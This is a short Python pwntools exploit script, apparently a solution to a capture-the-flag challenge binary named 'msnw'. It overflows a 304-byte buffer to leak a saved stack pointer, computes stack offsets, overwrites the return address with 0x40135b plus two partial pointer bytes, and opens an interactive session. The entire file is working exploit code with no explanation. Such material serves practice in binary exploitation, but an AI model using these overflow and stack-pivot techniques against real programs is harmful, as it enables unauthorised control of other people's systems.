#!/usr/bin/python3

from pwn import *

exe = ELF('./msnw')
p = process(exe.path)
#p = gdb.debug(  exe.path, gdbscript='b *0x401292')
#p = remote('localhost', 31337)  

payload = b'a' * 304
p.sendafter(b': ',payload)
p.recvuntil(b'a' * 304)
leak_rbp = u64(p.recv(6) + b'\0\0')
log.info('leak_rbp: ' + hex(leak_rbp))
now_rbp = leak_rbp - 0x200
offset_insert = now_rbp -16
log.info('offset_insert: ' + hex(offset_insert))
b0 = offset_insert & 0xff           
b1 = (offset_insert >> 8) & 0xff     

var1 = bytes([b0])   
var2 = bytes([b1])   

payload = b'a' * 296 + p64(0x000000000040135b) + var1 +var2
buf = leak_rbp - 0x1c0 - 0x130
log.info('buf: ' + hex(buf))
p.sendafter(b': ',payload)
p.interactive()


